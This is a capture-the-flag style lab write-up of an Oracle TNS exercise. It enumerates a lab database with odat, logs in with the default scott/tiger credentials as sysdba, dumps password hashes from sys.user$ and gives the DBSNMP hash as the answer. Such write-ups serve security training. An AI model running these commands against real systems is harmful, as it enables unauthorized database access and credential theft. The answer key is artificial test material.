### Oracle TNS Exercise
 
IP: 10.129.205.19
 
---
 
### Question 1:
Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
 
I start off by installing all of the requirements to run odat and then run it.
 
```diff
+ $ ./odat.py all -s 10.129.205.19
```
 
	<snip>
	[+] Service Name(s) found on the 10.129.205.19:1521 server: XE,XEXDB
	<snip>
	[+] Accounts found on 10.129.205.19:1521/sid:XE:
	scott/tiger
	<snip>
	[+] Accounts found on 10.129.205.19:1521/serviceName:XEXDB:
	scott/tiger
 
Afterwards, I install sqlplus and login with the found credentials on the found SID.
 
```diff
+ $ sqlplus scott/tiger@10.129.205.19/XE
```
 
	SQL>
 
Seeing that this works, I check to see if the user has appropriate privileges to login as System Database Admin.
 
```diff
+ $ sqlplus scott/tiger@10.129.205.19/XE as sysdba
```
 
	SQL>
 
It works, and with this I take a look at users and their passwords from sys.user$.
 
```diff
+ SQL> select name, password from sys.user$;
```
 
	NAME			       PASSWORD
	------------------------------ ------------------------------
	ORACLE_OCM		       5A2E026A9157958C
	RECOVERY_CATALOG_OWNER
	SCHEDULER_ADMIN
	HS_ADMIN_SELECT_ROLE
	HS_ADMIN_EXECUTE_ROLE
	HS_ADMIN_ROLE
	OEM_ADVISOR
	OEM_MONITOR
	DBSNMP			       E066D214D5421CCC
	APPQOSSYS		       519D632B7EE7F63A
	PLUSTRACE
 
From the output, I can see that the password hash for DBSNMP is E066D214D5421CCC.
 
&#x1F6A9; found **E066D214D5421CCC**.
 
